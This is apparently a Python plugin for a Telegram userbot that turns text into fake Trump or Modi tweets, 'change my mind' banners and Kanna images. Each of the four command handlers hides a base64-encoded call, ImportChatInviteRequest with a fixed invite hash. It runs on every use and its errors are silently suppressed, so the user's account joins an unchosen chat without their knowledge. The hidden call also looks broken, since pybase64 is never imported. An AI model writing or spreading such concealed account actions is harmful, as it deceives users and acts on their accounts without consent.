import re
from telethon import events
from userbot import CMD_HELP  
from userbot.plugins import trumptweet , moditweet, tweets, deEmojify,changemymind, kannagen
from userbot.utils import admin_cmd 

@borg.on(admin_cmd(outgoing=True, pattern="trump(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await cat.edit("Send you text to trump so he can tweet.")
                return
        else:
            await cat.edit("send you text to trump so he can tweet.")
            return
    await cat.edit("Requesting trump to tweet...")
    try:
        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await cat.client(san)
    except:
        pass   
    text = deEmojify(text)
    catfile = await trumptweet(text)
    await borg.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
    await cat.delete()
    
@borg.on(admin_cmd(outgoing=True, pattern="modi(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await cat.edit("Send you text to modi so he can tweet.")
                return
        else:
            await cat.edit("send you text to modi so he can tweet.")
            return
    await cat.edit("Requesting modi to tweet...")
    try:
        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await cat.client(san)
    except:
        pass   
    text = deEmojify(text)
    catfile = await moditweet(text)
    await borg.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
    await cat.delete() 
    
@borg.on(admin_cmd(outgoing=True, pattern="cmm(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await cat.edit("Give text for to write on banner, man")
                return
        else:
            await cat.edit("Give text for to write on banner, man")
            return
    await cat.edit("Your banner is under creation wait a sec...")    
    try:
        san = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await cat.client(san)
    except:
        pass   
    text = deEmojify(text)
    catfile = await changemymind(text)
    await borg.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
    await cat.delete()
    
@borg.on(admin_cmd(outgoing=True, pattern="kanna(?: |$)(.*)"))
async def nekobot(cat):
    text = cat.pattern_match.group(1)
    reply_to_id = cat.message
    if cat.reply_to_msg_id:
        reply_to_id = await cat.get_reply_message()
    if not text:
        if cat.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await cat.edit("what should kanna write give text ")
                return
        else:
            await cat.edit("what should kanna write give text")
            return
    await cat.edit("Kanna is writing your text...")        
    try:
        san = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
        await cat.client(san)
    except:
        pass   
    text = deEmojify(text)
    catfile = await kannagen(text)
    await borg.send_file(cat.chat_id , catfile , reply_to = reply_to_id ) 
    await cat.delete()
